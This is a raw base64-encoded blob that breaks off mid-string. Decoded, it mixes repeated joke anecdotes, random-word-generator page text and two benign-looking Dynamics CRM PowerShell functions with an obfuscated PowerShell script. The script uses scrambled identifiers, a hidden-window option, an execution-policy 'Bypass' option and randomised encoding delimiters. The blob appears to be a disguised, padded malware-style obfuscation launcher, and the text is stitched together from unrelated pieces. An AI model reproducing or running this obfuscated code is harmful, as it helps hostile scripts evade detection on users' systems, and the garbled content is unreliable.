XQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiAyM3sKCgogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCiAgICAgICAgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtU2VydmljZUNsaWVudF0kY29ubiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSldCiAgICAgICAgW0FsaWFzKCJVc2VyU2V0dGluZ3NSZWNvcmQiKV0KICAgICAgICBbUFNPYmplY3RdJENybVJlY29yZAogICAgKQoKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKICAgIAogICAgdHJ5CiAgICB7CiAgICAgICAgJHJlc3VsdCA9IFNldC1Dcm1SZWNvcmQgLWNvbm4gJGNvbm4gLUNybVJlY29yZCAkQ3JtUmVjb3JkCiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgIHRocm93CiAgICB9ICAgIAp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBkKCkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgZCgpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBmKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gMjQgewoKICAgIFtPdXRwdXRUeXBlKFt2b2lkXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQb3NpdGlvbj0wKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiLCBWYWx1ZUZyb21QaXBlbGluZT0kdHJ1ZSldCiAgICAgICAgW1BTT2JqZWN0W11dJENybVJlY29yZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MSwgUGFyYW1ldGVyU2V0TmFtZT0iTmFtZVdpdGhJZCIpXQogICAgICAgIFtzdHJpbmddJEVudGl0eUxvZ2ljYWxOYW1lLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW2d1aWRdJElkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0zKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5TZGsuRW50aXR5UmVmZXJlbmNlXSRQcmluY2lwYWwsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTQpXQogICAgICAgIFtNaWNyb3NvZnQuQ3JtLlNkay5NZXNzYWdlcy5BY2Nlc3NSaWdodHNdJEFjY2Vzc01hc2sKICAgICkKICAgIGJlZ2luCiAgICB7CiAgICAgICAgJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKQoKICAgICAgICBpZiAoJEVudGl0eUxvZ2ljYWxOYW1lKSB7CiAgICAgICAgICAgICRDcm1SZWNvcmQgKz0gW1BTQ3VzdG9tT2JqZWN0XSBAewogICAgICAgICAgICAgICAgbG9naWNhbG5hbWUgPSAkRW50aXR5TG9naWNhbE5hbWUKICAgICAgICAgICAgICAgICIkKCRFbnRpdHlMb2dpY2FsTmFtZSlpZCIgPSAkSWQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHByb2Nlc3MKICAgIHsKICAgICAgICBmb3JlYWNoICgkcmVjb3JkIGluICRDcm1SZWNvcmQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRyZXF1ZXN0ID0gW01pY3Jvc29mdC5Dcm0uU2RrLk1lc3NhZ2VzLk1vZGlmeUFjY2Vzc1JlcXVlc3RdOjpuZXcoKQogICAgICAgICAgICAgICAgJHJlcXVlc3QuVGFyZ2V0ID0gTmV3LUNybUVudGl0eVJlZmVyZW5jZSAtRW50aXR5TG9naWNhbE5hbWUgJHJlY29yZC5sb2dpY2FsbmFtZSAtSWQgJHJlY29yZC4oJHJlY29yZC5sb2dpY2FsbmFtZSArICJpZCIpCiAgICAgICAgICAgICAgICAkcHJpbmNpcGFsQWNjZXNzID0gW01pY3Jvc29mdC5Dcm0uU2RrLk1lc3NhZ2VzLlByaW5jaXBhbEFjY2Vzc106Om5ldygpCiAgICAgICAgICAgICAgICAkcHJpbmNpcGFsQWNjZXNzLlByaW5jaXBhbCA9ICRQcmluY2lwYWwKICAgICAgICAgICAgICAgICRwcmluY2lwYWxBY2Nlc3MuQWNjZXNzTWFzayA9ICRBY2Nlc3NNYXNrCiAgICAgICAgICAgICAgICAkcmVxdWVzdC5QcmluY2lwYWxBY2Nlc3MgPSAkcHJpbmNpcGFsQWNjZXNzCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIFtNaWNyb3NvZnQuQ3JtLlNkay5NZXNzYWdlcy5Nb2RpZnlBY2Nlc3NSZXNwb25zZV0kY29ubi5FeGVjdXRlKCRyZXF1ZXN0KSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgJF8KICAgICAgICAgICAgfSAgIAogICAgICAgIH0KICAgIH0KfQokZFhuWTNnTVJwY2pRNHVEQmtRSEZVQXlScEZ4RGpuU3BaQVRGTWdYOWt3eDVKTmpDRzQgPSBAIgogICAgICAgIFtWYWxpZGF0ZVNldCgoV1VKSkV5Q2lnQ0lLV3JnbCgnTm9ybWFsJykpLCAod1VKSmVZQ0lHQ2lLV3JnTCgnTWluaW1pemVkJykpLCAod3VKakV5Q0lHQ2lLd3JnbCgnTWF4aW1pemVkJykpLCAoV3VqSkVZQ0lHY0lLV3JnbCgnSGlkZGVuJykpKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICR0eHk3d3g3M1MsCgogICAgICAgIFtWYWxpZGF0ZVNldCgod1VqSkVZQ2lHQ0lLd1JHTCgnQnlwYXNzJykpLCAod3VqSkVZY0lHQ0lLd3JHbCgnVW5yZXN0cmljdGVkJykpLCAod1VKakVZY0lHQ0lrV1JnbCgnUmVtb3RlU2lnbmVkJykpLCAod1VKSkVZQ2lHY2lLV3JnbCgnQWxsU2lnbmVkJykpLCAoV3VqakVZQ0lHQ0lrd1JnbCgnUmVzdHJpY3RlZCcpKSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkb2l3VWFJYnh1TGNzaFksCiAgICAgICAgCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkeXN0a0VIOU1SMWV1STdPZDMKICAgICkKCiAgICAjIEVuY29kaW5nIGJhc2UgdmFsdWVzOiAxNj1IZXgsIDg9T2N0YWwsIDI9QmluYXJ5CiAgICAkR01kX0pPOElDSXAgPSAyCgogICAgIyBFaXRoZXIgY29udmVydCBTY3JpcHRCbG9jayB0byBhIFN0cmluZyBvciBjb252ZXJ0IHNjcmlwdCBhdCAkUGF0aCB0byBhIFN0cmluZy4KICAgIElmKCRUYlN0Q3BCUFZbKCd7MH17MX0nLWYnUGF0JywnaCcpXSkKICAgIHsKICAgICAgICBHZXQtQ2hpbGRJdGVtICRId2w0QlVDS1k5IC1FcnJvckFjdGlvbiBTdG9wIHwgT3V0LU51bGwKICAgICAgICAkUTd4QVFOcTFZODhlID0gW0lPLkZpbGVdOjpSZWFkQWxsVGV4dCgoUmVzb2x2ZS1QYXRoICRod2w0YnVjS1k5KSkKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICAkcTd4YVFOcTFZODhlID0gW1N0cmluZ10kbzlEZjBTUnB0ODNGNkJobzVpCiAgICB9CgogICAgIyBDcmVhdGUgbGlzdCBvZiByYW5kb20gZGVsaW1pdGVycyAkUmFuZG9tRGVsaW1pdGVycy4KICAgICMgQXZvaWQgdXNpbmcgLiAqICcgIiBbIF0gKCApIGV0Yy4gYXMgZGVsaW1pdGVycyBhcyB0aGVzZSB3aWxsIGNhdXNlIHByb2JsZW1zIGluIHRoZSAtU3BsaXQgY29tbWFuZCBzeW50YXguCiAgICAkYVZWUzhZMTJrdG1XX2Q1ICA9IEAoKFd1akpFeUNJR0NJS3dyR0woJ18nKSksKHdVSkpFWWNJR0NJa1dSR2woJy0nKSksKHd1akpleWNJR0NJS1dyZ0woJywnKSksKFd1akpFWUNJR0NJS3dSZ0woJ3snKSksKHdVakpleUNJZ2NJa1dSZ0woJ30nKSksKHdVSkpleUNJR0NJS1dSZ0woJ34nKSksKFdVakpFWWNJR2NpS1dyR0woJyEnKSksKFdVSkpFWUNpZ0NJa3dyR0woJ0AnKSksKHdVakplWUNJZ0NJa3dyZ0woJyUnKSksKFdVampleUNJZ2Npa1dyR2woJyYnKSksKHd1SkpFWUNJR0NJS3dyZ0woJzwnKSksKHdVakpFWWNJR0NJa1dyZ0woJz4nKSksKHd1SmpFWUNJR0NJS1dSZ2woJzsnKSksKHd1SkpFWWNJR2NpS1dyZ2woJzonKSkpCgogICAgIyBBZGQgbGV0dGVycyBhLXogd2l0aCByYW5kb20gY2FzZSB0byAkUmFuZG9tRGVsaW1pdGVycy4KICAgIEAoKFdVSkpFWUNJZ0NpS1dyZ2woJ2EnKSksKHd1SkpFWWNJR0NJa1dyR2woJ2InKSksKFd1ampFeWNJZ0NpS1dyR0woJ2MnKSksKHd1akpFWUNJZ2Npa3dyZ0woJ2QnKSksKFd1SmpFeUNJR0NJS3dyZ2woJ2UnKSksKHdVSkplWWNpZ0NJa1dyZ2woJ2YnKSksKFd1SkpFeWNJR0NJS1dSZ0woJ2cnKSksKHd1ampleWNpR2Npa1dyZ0woJ2gnKSksKHd1SkplWUNpR0NJS1dyZ2woJ2knKSksKHdVakpFWUNpZ2NJS3dSZ2woJ2onKSksKHdVampFWUNJZ0NJS1dSR0woJ2snKSksKHdVSkpFWUNpR0NJa1dyR0woJ2wnKSksKFd1SmplWWNJR2NJS1dyZ2woJ20nKSksKHdVamplWUNpR0NpS1dSR0woJ24nKSksKFd1SmpFWWNJZ0NJa3dyR2woJ28nKSksKHd1SkpFeWNJR0NpS3dyZ2woJ3AnKSksKFd1akplWUNJR2NJa3dyR0woJ3EnKSksKHdVSkpFeUNJZ0NJa1dSR2woJ3InKSksKHd1SkplWWNJR0NJS1dyZ0woJ3MnKSksKHd1ampFWUNJR2Npa1dSZ0woJ3QnKSksKFdVampFeUNpZ0NJa1dyR0woJ3UnKSksKHd1akpleWNJR2NJS1dyR2woJ3YnKSksKHd1akplWUNJR0NJS3dyZ0woJ3cnKSksKFd1SkplWWNJZ0NJa1dyZ0woJ3gnKSksKHdVakpleUNpZ0NpS1dyZ2woJ3knKSksKFdVSkpFWWNpR2Npa1dyZ2woJ3onKSkpIHwgRm9yRWFjaC1PYmplY3QgeyRRT2g3a1YxMUZSZVM2XzJuaSA9ICRfOyBJZigoKEdldC1SYW5kb20gLUlucHV0IEAoKDIgLSAxKS4uKDIgKyAoMSAtIDEpKSkpLSgzIC0gMikgLWVxIDApKSB7JFFPSDdLVjExRlJlUzZfMm5JID0gJHFPaDdrVjExRnJlUzZfMk5pLlRv